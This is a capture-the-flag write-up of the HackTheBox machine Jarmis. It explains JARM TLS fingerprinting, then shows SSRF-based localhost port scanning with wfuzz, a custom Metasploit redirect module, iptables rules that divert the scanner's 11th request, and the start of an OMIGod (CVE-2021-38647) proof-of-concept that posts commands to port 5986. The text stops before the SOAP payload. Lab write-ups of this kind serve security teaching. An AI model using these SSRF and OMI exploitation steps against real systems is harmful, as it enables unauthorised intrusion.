---
title: HTB: Jarmis
url: https://0xdf.gitlab.io/2021/09/27/htb-jarmis.html
date: 2021-09-27T09:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-jarmis, ja3, ja3s, jarm, tls, nmap, vhosts, ncat, feroxbuster, fastapi, ssrf, wfuzz, jq, metasploit, msf-custom-module, iptables, omigod, cve-2021-38647, python, flask, gopher, code-review, htb-laser, htb-travel, uhc
---

![Jarmis](https://0xdfimages.gitlab.io/img/jarmis-cover.png)

My favorite part about Jarmis was that it is centered around this really neat technology used to fingerprint and identify TLS servers. There’s an application that will scan a given server and report back the Jarm signature, and if that signature matches something potentially malicious in the database, it will do a GET request to that server to collect additional metadata. I’ll abuse that service to get a list of open ports on localhost and find 5985/5986, which are typically WinRM. Given that Jarmis is a Linux host, it’s odd, and it turns out that this is the same port that OMI listens to, and the host is vulnerable to OMIGod. To exploit this, I’ll find a POC and convert it into a Gopher redirect by redirecting the GET request. I’ll need to create a malicious server as well, and I’ll show two ways, using IPTables and a custom Metasploit module. In Beyond Root, I’ll look at the webserver config, and find the error in the public Jarm code that allowed me to use Jarm as a port scanner.

## Box Info

| Name | [Jarmis](https://hackthebox.com/machines/jarmis)  [Jarmis](https://hackthebox.com/machines/jarmis) [Play on HackTheBox](https://hackthebox.com/machines/jarmis) |
| --- | --- |
| Release Date | 27 Sep 2021 |
| Retire Date | 27 Sep 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creators | [ippsec ippsec](https://app.hackthebox.com/users/3769)  [waldo waldo](https://app.hackthebox.com/users/1471) |

## Background - JARM

Jarmis is built around an API in front of a database of JARM fingerprints. Before going into the box, it’s worth understanding what JARMs (and JA3 and JA3S fingerprints) are.

### JA3

In early 2019, some researchers at Saleforce announced [JA3 fingerprints](https://github.com/salesforce/ja3) as a way of fingerprinting TLS clients. When I client starts a TLS connection, first it establishes a TCP connection (full three-way handshake), and then it starts a TLS handshake. The TLS handshake offers the TLS version, the list of accepted ciphers, list of extensions, elliptic curves, and elliptic curve formats for the client. It turns out that different clients have different settings here, and the JA3 takes all the information and outputs it as a single string that looks like this:

```

769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0

```

This is not a hash, as the values can be decoded back to a full understanding of the connection. They do offer also a 32-character version of the JA3, which is just the MD5 hash of that string above, used for easier comparisons.

These fingerprints can be calculated completely passively just by watching the TLS handshake, either in real-time or in a PCAP. JA3 signatures have has some success in identifying different families of malware and separating them from legit clients (like Firefox). The ability to collect JA3 signatures is now available in all kinds of network monitoring, including Zeek (formerly Bro) and Surricata.

### JA3S

At the same time that they announced JA3, they also announced JA3S, which is a similar fingerprint but for the server. The challenges that come up with JA3S are:
- There are far fewer values that the server responds with. Where the client sends all the ciphers it supports, the server just sends back the one it wants to use. Fewer values means that the fingerprints are less specific, and therefore less useful.
- The server response will depend on the client packet. The same server may tell one client to use cipher A, but the next client to use B when that client didn’t offer A.

The resulting fingerprint only has three values:

```

SSLVersion,Cipher,SSLExtension

```

### JARM

In late 2020, the same researchers [announced JARMs](https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a), which attempt to improve on server fingerprinting. JARMs are based on an active scan of the server, where the scanner will start ten different connections to the server, and record each of them to help identify how it responds uniquely.

Looking at the format of a JARM fingerprint, it is a fuzzy hash:

```

2ad2ad0002ad2ad00042d42d00000069d641f34fe76acdc05c40262f8815e5

```

The first 30 characters are the TLS version chosen by the server for each of the ten client hello messages the scanner sent it. The back 32 characters are a truncated SHA256 hash of the cumulative extension sent by the server.

For the ten connections made to get a JARM, the TCP connection is killed after the TLS server responds with it’s Hello message, as all the necessary info is collected at that point. So the server never get an actual request for any content.

Shodan, the most famous internet scanner, has included JARM fingerprints since [around their release](https://twitter.com/shodanhq/status/1328911823006035970?lang=en).

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.117
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 15:46 EDT
Warning: 10.10.11.117 giving up on port because retransmission cap hit (10).
Nmap scan report for jarmis.htb (10.10.11.117)
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 98.77 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.117
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 15:48 EDT
Nmap scan report for jarmis.htb (10.10.11.117)
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Jarmis
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.34 seconds

```

Based on the [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server), the host is likely running Ubuntu 20.04 Focal.

### Website - TCP 80

#### Site

Trying to visit `http://10.10.11.117` just hangs at “Loading…”:

![image-20210922155128083](https://0xdfimages.gitlab.io/img/image-20210922155128083.png)

Looking in Burp, the GET to `/` is followed by four more GETs, one of which is to `http://jarmis.htb`:

![image-20210922155231243](https://0xdfimages.gitlab.io/img/image-20210922155231243.png)

I’ll add `jarmis.htb` to `/etc/hosts`, and then visit that. It loads a Jarmis Search Engine:

![image-20210922155406944](https://0xdfimages.gitlab.io/img/image-20210922155406944.png)

A JARM signature is a way of identifying different TLS servers.

The dropdown has three available searches:

![image-20210922155459412](https://0xdfimages.gitlab.io/img/image-20210922155459412.png)

Giving it a random id, like 5, returns JSON:

![image-20210922155523515](https://0xdfimages.gitlab.io/img/image-20210922155523515.png)

I can put that `sig` value into the “Search Signature” option and get the same result.

For “Fetch Jarm”, it doesn’t say what to enter besides “string”:

![image-20210922155838390](https://0xdfimages.gitlab.io/img/image-20210922155838390.png)

Still, I can guess it takes a URL. I’ll give it `https://10.10.14.6` , and want some way to see if traffic reaches me. `python -m http.server` doesn’t support TLS. I’ll use `ncat` to start. `ncat` actually installs itself over `nc` (`apt install ncat`), as it just offers a superset of what `nc` traditionally has. It includes the `--ssl` option:

```

oxdf@parrot$ nc --ssl -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 0010 406C A496 2691 BA82 388F CAEF 1C82 F2B2 C9C2
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

```

On feeding it my URL, there’s a connection and it closes:

```

oxdf@parrot$ nc --ssl -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 0010 406C A496 2691 BA82 388F CAEF 1C82 F2B2 C9C2
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36734.
Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)

```

A few seconds later the page returns:

```

{
  "sig": "21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46",
  "ismalicious": false,
  "endpoint": "10.10.14.6:443",
  "note": "10.10.14.6",
  "server": ""
}

```

JARMs are calculated based on 10 different TLS connection attempts, but only the first one is responded to here. My gut is that the JARM code should not return a signature if the server stops allowing even a TCP connection, but the public code actually just puts `000` for that connection, which explains all the 0s in the `sig` above.

If I run `ncat` with `-k` to allow multiple connections, I can see all 10:

```

oxdf@parrot$ nc --ssl -lnvkp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 1FBB 1281 6D10 158E 1FD0 CFA4 9FBA 9AC6 0AEA 6A5E
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36758.
Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36760.
Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36762.
Ncat: Failed SSL connection from 10.10.11.117: error:1417A0C1:SSL routines:tls_post_process_client_hello:no shared cipher
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36764.
Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36766.
Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36768.
Ncat: Failed SSL connection from 10.10.11.117: error:14209102:SSL routines:tls_early_post_process_client_hello:unsupported protocol
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36770.
Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36772.
Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36774.
Ncat: Failed SSL connection from 10.10.11.117: error:142090C1:SSL routines:tls_early_post_process_client_hello:no shared cipher
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:36776.
Ncat: Failed SSL connection from 10.10.11.117: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share

```

Interestingly, the JSON is shorter here:

```

{
  "sig": "21d19d00021d21d00042d43d000000107066a9db8d16b0a001ff4969166ce7",
  "endpoint": "10.10.14.6:443",
  "note": "10.10.14.6"
}

```

The `ismalicious` and `server` fields are missing.

If I search for the JARM of the second one, it’s not in the database, but the first one is.

#### Tech Stack

The site is completely in JavaScript, something like React based on the filenames. The headers just show NGINX.

When I make requests of the site, I see things like `/api/v1/search/id/5` and `/api/v1/fetch?endpoint=https://10.10.14.6`. Basically the site is running off local JavaScript, and making requests to the API to get the data and load it in place.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@parrot$ feroxbuster -u http://jarmis.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://jarmis.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       12w      178c http://jarmis.htb/api
200       31l       63w      967c http://jarmis.htb/docs
301        7l       12w      178c http://jarmis.htb/static
301        7l       12w      178c http://jarmis.htb/static/css
301        7l       12w      178c http://jarmis.htb/static/js
[####################] - 1m    149995/149995  0s      found:5       errors:0      
[####################] - 1m     29999/29999   339/s   http://jarmis.htb
[####################] - 1m     29999/29999   336/s   http://jarmis.htb/api
[####################] - 1m     29999/29999   340/s   http://jarmis.htb/static
[####################] - 1m     29999/29999   338/s   http://jarmis.htb/static/css
[####################] - 1m     29999/29999   340/s   http://jarmis.htb/static/js

```

I noticed `/api` above, and could fuzz that.

`/docs` is interesting. The rest is likely just static stuff.

#### /docs

This site gives documentation about the API:

[![image-20210922165959390](https://0xdfimages.gitlab.io/img/image-20210922165959390.png)](https://0xdfimages.gitlab.io/img/image-20210922165959390.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210922165959390.png)

The first one takes an ID and returns an JARM, just like I observed on the front page.

`signature` takes a string and an optional `max_results`:

![image-20210922170411414](https://0xdfimages.gitlab.io/img/image-20210922170411414.png)

`fetch` gives a bit more information:

![image-20210922170122847](https://0xdfimages.gitlab.io/img/image-20210922170122847.png)

“grab metadata if malicious” is interesting. That sounds more like a connection, not just handshake and close.

### Localhost TLS Port Scan

Using the `fetch` endpoint, I can scan the local machine for open ports:

```

oxdf@parrot$ curl http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:20
{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"null","note":"localhost"} 
oxdf@parrot$ curl http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:21
{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"null","note":"localhost"}
oxdf@parrot$ curl http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:22
{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"127.0.0.1:22","note":"localhost"}
oxdf@parrot$ curl http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:23
{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"null","note":"localhost"}
oxdf@parrot$ curl http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:80
{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"127.0.0.1:80","note":"localhost"} 
oxdf@parrot$ curl http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:81
{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"null","note":"localhost"}

```

It seems like for some reason the site sets `endpoint` field if the port is open but not if it’s closed. I got a little bit lucky here because the site only works this way if I scan localhost, not 127.0.0.1:

```

oxdf@parrot$ curl http://jarmis.htb/api/v1/fetch?endpoint=http://127.0.0.1:81
{"sig":"00000000000000000000000000000000000000000000000000000000000000", "endpoint":"127.0.0.1:81","note":"127.0.0.1"}

```

A good reminder to try both of them just in case when fuzzing things. I’ll look at why in [Beyond Root](#code-review).

I’ll try fuzzing with localhost, using `--hs '"endpoint":"null"'` to hide results containing that string:

```

oxdf@parrot$ wfuzz -z range,1-65535 --hs '"endpoint":"null"' -u http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ
Total requests: 65535

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000022:   200        0 L      1 W        117 Ch      "22"
000000080:   200        0 L      1 W        117 Ch      "80"
000005986:   200        0 L      1 W        119 Ch      "5986"
000008001:   200        0 L      1 W        119 Ch      "8001"
000005985:   200        0 L      1 W        119 Ch      "5985"
000038332:   200        0 L      1 W        120 Ch      "38332"
000046012:   200        0 L      1 W        120 Ch      "46012"

Total time: 636.1354
Processed Requests: 65535
Filtered Requests: 65528
Requests/sec.: 103.0205

```

Sometimes when I ran this brute I would get some stray 502 errors back from the server. These are not positive hits, and I could include `--hc 502` to clear those as well.

I knew about 22 and 80 already. The two high ports could be interesting, but I’m immediately interested in 5985 and 5986. These are typically the WinRM ports on Windows. On Linux, they happen to be used by Open Management Interface, or OMI, which is the software exploitable by [CVE-2021-38647](https://www.tenable.com/blog/cve-2021-38647-omigod-critical-flaw-leaves-azure-linux-vms-vulnerable-to-remote-code-execution), or OMIGod.

## Identify SSRF

### Download Data

#### signature - Fail

I had hoped to download a bunch of the database using the signature API.

Pushing the “Try It Out” button gives the `curl` syntax to run:

![image-20210922170520988](https://0xdfimages.gitlab.io/img/image-20210922170520988.png)

Unfortunately, it requires a full signature:

```

oxdf@parrot$ curl 'http://jarmis.htb/api/v1/search/signature/?keyword=21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46&max_results=10'
{"results":[{"id":135,"sig":"21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46","ismalicious":true,"endpoint":"104.24.4.98","note":"Ncat","server":""}]}

oxdf@parrot$ curl 'http://jarmis.htb/api/v1/search/signature/?keyword=2&max_results=10'
Internal Server Error

oxdf@parrot$ curl 'http://jarmis.htb/api/v1/search/signature/?keyword=2*&max_results=10'
{"results":[]}

```

Without knowing all the values, I don’t have a good way to download them.

#### By ID

I determined with a quick manual binary search that there are 222 values in the database (assuming they are continuous):

```

oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/200
{"id":200,"sig":"29d29d00029d29d21c29d29d29d29df3fb741bc8febeb816e400df4c5f2e9e","ismalicious":false,"endpoint":"176.32.103.205:443","note":"amazon.com"}
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/2000
null
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/1000
null
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/500
null
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/300
null
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/250
null
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/225
null
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/210
{"id":210,"sig":"21d02d00000000021c21d02d21d21db2e1191a3715fa469c667680e6cfab7f","ismalicious":false,"endpoint":"118.191.216.57:443","note":"sogou.com"}
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/220
{"id":220,"sig":"29d29d00029d29d21c42d43d00041d44609a5a9a88e797f466e878a82e8365","ismalicious":false,"endpoint":"3.211.157.115:443","note":"netflix.com"}
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/222
{"id":222,"sig":"27d27d27d00027d1dc27d27d27d27d3446fb8839649f251e5083970c44ad30","ismalicious":false,"endpoint":"47.246.24.234:443","note":"login.tmall.com"}
oxdf@parrot$ curl http://jarmis.htb/api/v1/search/id/223
null

```

This loop will in less than a minute pull each record and dump it into a file:

```

oxdf@parrot$ for i in $(seq 0 222); do curl http://jarmis.htb/api/v1/search/id/${i} -s >> jarms.json; echo >> jarms.json; done

```

### Identify Malicious Jarms

`jq` is the tool to use here. `jq` takes JSON data and applies a filter string to manipulate it. I like to work with a base command that looks like:

```

oxdf@parrot$ cat jarms.json | jq '.' | less

```

I use `less` because otherwise data will fill up my terminal (though I’ll show it without for readability here). I start with just `'.'` to show everything (pretty printed):

![image-20210922172320866](https://0xdfimages.gitlab.io/img/image-20210922172320866.png)

I really want to look at just the malicious signatures, since that’s where it indicated that it would pull metadata:

```

oxdf@parrot$ cat jarms.json | jq '. | select(.ismalicious==true)'
{
  "id": 95,
  "sig": "2ad2ad00000000000043d2ad2ad43dc4b09cccb7c1d19522df9b67bf57f4fb",
  "ismalicious": true,
  "endpoint": "104.24.4.98",
  "note": "Sliver",
  "server": "Apache/2.4.40"
}
{
  "id": 128,
  "sig": "2ad2ad0002ad2ad00042d42d000000ad9bf51cc3f5a1e29eecb81d0c7b06eb",
  "ismalicious": true,
  "endpoint": "185.199.109.153",
  "note": "SilentTrinity",
...[snip]...

```

Perfect. How many are there? `-c` will condense each record to one line:

```

oxdf@parrot$ cat jarms.json | jq -c '. | select(.ismalicious==true)' | wc -l
10

```

I’ll print the IDs and `note` for each:

```

oxdf@parrot$ cat jarms.json | jq -c '. | select(.ismalicious==true) | [.id, .note]' 
[95,"Sliver"]
[128,"SilentTrinity"]
[135,"Ncat"]
[154,"Metasploit"]
[170,"Trickbot"]
[174,null]
[178,"AsyncRAT"]
[179,"Sliver"]
[184,"Gophish"]
[197,"CobaltStrike"]

```

### Identify Request

#### Multi Handler

Because Metasploit is in the list, I’ll start that up and see what happens. I started with `exploit/multi/handler` with a payload of `windows/meterpreter/reverse_https`, with the `LPORT` set to 443. I’ll also start Wireshark. While I won’t be able to see content inside TLS, I can at least count streams.

When I try to fetch the Jarm, I don’t get anything at MSF, but it returns data:

```

{
  "sig": "07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d",
  "ismalicious": true,
  "endpoint": "10.10.14.6:443",
  "note": "Metasploit",
  "server": "Apache"
}

```

Interestingly it has a `server` field, and it is malicious. In Wireshark, there are 12 TCP streams. The first one is the request from me to Jarmis to submit the url:

![image-20210922180026521](https://0xdfimages.gitlab.io/img/image-20210922180026521.png)

There there are 11 TLS streams that I can’t read. The fact that there are 11 is interesting. Jarm only requires 10. I’ll want to figure out what the 11th is.

#### Capture HTTP

I also tried the `auxiliary/server/capture/http` module, as this is designed to capture HTTP(S) requests. I’ll set TLS on and set the `srvport` to 443 and run the server:

```

msf6 auxiliary(server/capture/http) > run
[*] Auxiliary module running as background job 1.
[*] Started service listener on 0.0.0.0:443 
[*] Server started.

```

When I submit my URL, there’s a hit on the server (sometimes):

```

[*] HTTP REQUEST 10.10.11.117 > 10.10.14.6:80 GET / Unknown   cookies=

```

Interestingly, if I run this module before I run the multi handler, it crashes rather than showing the connection, but for some reason running multi handler first stabilizes it. I can’t explain this.

Either way, the resulting JSON is the same, and a bit different from above:

```

{
  "sig": "07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d",
  "ismalicious": false,
  "endpoint": "10.10.14.6:443",
  "note": "Metasploit?",
  "server": ""
}

```

It doesn’t show malicious, but suggests maybe Metasploit. The server field is present but empty.

This scan also consists of 11 requests.

### Redirect

#### Strategy

I know that JARMs use 10 TLS requests to create the signature. I’ve noticed that when a JARM is malicious, there’s an 11th request. It seems likely related to this line from `/docs`:

> Full collisions are possible. That is why this service also utilzies metadata when deconfliction is necessary.

I’ll show the code that’s generating these requests in [Beyond Root](#general).

I want to redirect this 11th request to see what it is and if I can turn it into SSRF. I’ll show two strategies for this, using Metasploit and `ncat`.

#### Metasploit

I’ll create a custom Metasploit module to see if I can redirect that last request. Metasploit modules go into `~/.msf4/modules`. Because I’ll run `msfconsole` as root (to listen on low ports, etc), I’ll need to work from `/root/.msf4`, so I’ll just get a console as root for this development.

First, I’ll make a directory

```

root@parrot# sudo mkdir -p /root/.msf4/modules/auxiliary/server/

```

Now I’ll start with another module that can listen on 443 and do a redirect, `auxiliary/server/capture/http_basic`.

```

root@parrot# cp /usr/share/metasploit-framework/modules/auxiliary/server/capture/http_basic.rb /root/.msf4/modules/auxiliary/server/jarmisRedirect.rb

```

This module has four functions:
- `initialize` - sets metadata
- `support_ipv6` - returns `false`
- `run` - sets variables and calls `exploit`
- `report_creds` - saves creds
- `on_request` - handles incoming HTTP(S) request

I’ll delete `report_creds` entirely. `on_request` is where I’ll do my redirect. Currently, it looks like:

```

  def on_request_uri(cli, req)
    if(req['Authorization'] and req['Authorization'] =~ /basic/i)
      basic,auth = req['Authorization'].split(/\s+/)
      user,pass  = Rex::Text.decode_base64(auth).split(':', 2)

      report_cred(
        ip: cli.peerhost,
        port: datastore['SRVPORT'],
        service_name: 'HTTP',
        user: user,
        password: pass,
        proof: req['Authorization']
      )

      print_good("HTTP Basic Auth LOGIN #{cli.peerhost} \"#{user}:#{pass}\" / #{req.resource}")
      if datastore['RedirectURL']
        print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")
        send_redirect(cli, datastore['RedirectURL'])
      else
        send_not_found(cli)
      end
    else
      print_status("Sending 401 to client #{cli.peerhost}")
      response = create_response(401, "Unauthorized")
      response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
      cli.send_response(response)
    end
  end

```

I don’t need the auth check, so I’ll reduce it to just do a redirect as long as the `RedirectURL` is set:

```

  def on_request_uri(cli, req)    
    if datastore['RedirectURL']    
      print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")    
      send_redirect(cli, datastore['RedirectURL'])    
    else    
      send_not_found(cli)    
    end    
  end   

```

Other than that, I’ll just update the metadata and how the options are set. The full script can be found [here](/files/jarmis-msf-mod.rb).

In MSF, I can exit and start it again, or run `reload_all` to get the new module. It’s there:

```

msf6 > search jarmis

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/server/jarmisRedirect                   normal  No     Redirect Jarmis Scanner to something else

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/server/jarmisRedirect

msf6 > use 0
msf6 auxiliary(server/jarmisRedirect) > options

Module options (auxiliary/server/jarmisRedirect):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   RedirectURL                   yes       The page to redirect users to
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      443              yes       The local port to listen on.
   SSL          true             yes       Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                       no        The URI to use for this exploit (default is random)

Auxiliary action:

   Name      Description
   ----      -----------
   Redirect  Run redirect web server

```

I’ll try giving a redirect to my own host and run:

```

msf6 auxiliary(server/jarmisRedirect) > set srvhost tun0
srvhost => 10.10.14.6
msf6 auxiliary(server/jarmisRedirect) > set redirecturl http://10.10.14.6/test
redirecturl => http://10.10.14.6/test
msf6 auxiliary(server/jarmisRedirect) > run
[*] Auxiliary module running as background job 0.
[*] Using URL: https://10.10.14.6:443/kQcebI79N1
[*] Server started.

```

When I give that url to Jarmis (the full URL including `/kQcebI79N1` or MSF won’t route it to this listener), after a couple seconds there’s a hit at MSF:

```

[*] Redirecting client 10.10.11.117 to http://10.10.14.6/test

```

And then a hit on a Python webserver I’m running:

```

root@parrot[/media/sf_CTFs/hackthebox/jarmis-10.10.11.117]# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.117 - - [23/Sep/2021 09:47:19] code 404, message File not found
10.10.11.117 - - [23/Sep/2021 09:47:19] "GET /test HTTP/1.1" 404 -

```

#### iptables / ncat

I noted earlier that `ncat` without the `-k` option was detected as malicious, but when I added `-k`, it wasn’t known by the DB. They are different because without just fills in nulls for the next nine requests, whereas the `-k` gives values:

| Option | JARM |
| --- | --- |
| no `-k` | `21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46` |
| `-k` | `21d19d00021d21d00042d43d000000107066a9db8d16b0a001ff4969166ce7` |

If I can run `nc` without the `-k`, letting it respond to the first request, fail on the next nine, and then redirect on the last, I could get the same behavior I got with MSF.

I’ll use `iptables` to do this with the following commands:

```

sudo iptables -F -t nat
sudo iptables -I PREROUTING -t nat -p tcp --dport 443 -m statistic --mode nth --every 11 --packet 10 -j REDIRECT --to-port 8443

```

The first will just clear the `nat` table, which is important to reset the counters (and a good command to run once I’m done with the box to reset these rules).

The second will look for traffic incoming to port 443 and then use the statistics mode to send every 11th packet to 8443.

I’ll run these and start `ncat` TLS listeners on both 443 and 8443. When I give my IP to Jarmis, I first see the hit on `ncat` on 443:

```

root@parrot[/media/sf_CTFs/hackthebox/jarmis-10.10.11.117]# nc --ssl -lnvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: ACB6 84C7 BE48 EB21 CA98 BAF7 6887 1DD4 3E1F 736A
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:47724.
Ncat: Failed SSL connection from 10.10.11.117: error:00000000:lib(0):func(0):reason(0)

```

Then a second or two later on 8443:

```

root@parrot[/media/sf_CTFs/hackthebox/jarmis-10.10.11.117]# nc --ssl -lnvp 8443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: A61B 19A8 8652 BA80 3C3E F71E EE41 7909 99B3 B456
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 10.10.11.117.
Ncat: Connection from 10.10.11.117:47768.
GET / HTTP/1.1
Host: 10.10.14.6
User-Agent: curl/7.74.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

```

## OMIGod

### Python POC

[This GitHub](https://github.com/horizon3ai/CVE-2021-38647) has a POC for CVE-2021-38647. The background about the CVE is that the Microsoft implementation of [Open Management Infrastructure](https://github.com/microsoft/omi) didn’t handle missing auth headers well, and just let it work.

The POC just involves sending a POST request to 5986 (with TLS) or 5985 (without) with a SOAP XML request in the body:

```

def exploit(target, command):
    headers = {'Content-Type': 'application/soap+xml;charset=UTF-8'}
    r = requests.post(f'https://{target}:5986/wsman', headers=headers, data=DATA.format(command), verify=False)
    output = re.search('<p:StdOut>(.*)</p:StdOut>', r.text)
    error = re.search('<p:StdErr>(.*)</p:StdErr>', r.text)
    if output:
        if output.group(1):
            print(output.group(1).rstrip('&#10;'))
    if error:
        if error.group(1):
            print(error.group(1).rstrip('&#10;'))

```

The body will have:

```

